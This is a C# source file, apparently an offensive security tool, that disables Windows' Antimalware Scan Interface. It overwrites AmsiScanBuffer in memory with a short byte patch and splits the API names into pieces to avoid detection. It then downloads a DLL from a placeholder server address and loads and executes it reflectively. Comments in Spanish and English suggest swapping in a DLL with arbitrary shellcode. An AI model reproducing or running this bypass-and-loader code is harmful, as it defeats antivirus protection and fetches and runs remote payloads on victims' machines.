using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Runtime.InteropServices;


//way to bypass AMSI. On this one we inject an Arbitrary DLL too.
//El DLL que se usa aqui, Hidden_Window hace que se cree un .txt con el output del comando sysinfo.
//Podemos combinar este metodo con un DLL en el que metemos shellcode arbitrario.
//Seteate un server para pillar el shellcode

namespace AmsiBypass
{   
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }

    class Program
    {
        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        static void Main(string[] args)
        {
            if (IntPtr.Size == 4)
                BypassAmsi(x86);
            else
                BypassAmsi(x64);
            var webClient = new System.Net.WebClient();
            var data = webClient.DownloadData("http://ip/Hidden_Window.dll");
            try
            {
                var assembly = Assembly.Load(data);
                if (assembly != null)
                {
                    Console.WriteLine("[*] AMSI bypassed");
                    Console.WriteLine("[*] Assembly Name: {0}", assembly.FullName);
                    assembly.GetType("sample.mysample").GetMethod("Main").Invoke(null, new object[] { });
            }

            }
            catch (BadImageFormatException e)
            {
                Console.WriteLine("[x] AMSI Triggered on loading assembly");
            }
            catch (System.Exception e)
            {
                Console.WriteLine("[x] Unexpected exception triggered");
            }
        }

        private static void BypassAmsi(byte[] p)
        {
            try{
                var lib = Win32.LoadLibrary("am"+"si.dll");
                var addr = Win32.GetProcAddress(lib, "A"+"msi"+"Sc"+"an"+"Buffer");
                uint oldProtect;

                Win32.VirtualProtect(addr, (UIntPtr)p.Length, 0x40, out oldProtect);

                for(int i=0; i < p.Length; i++)
                {
                    Marshal.WriteByte(addr + i, p[i]);
                }
                Console.WriteLine("[*] AMSI Patched");
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] {0}", e.Message);
                Console.WriteLine("[x] {0}", e.InnerException);
            }
        }
    }
}

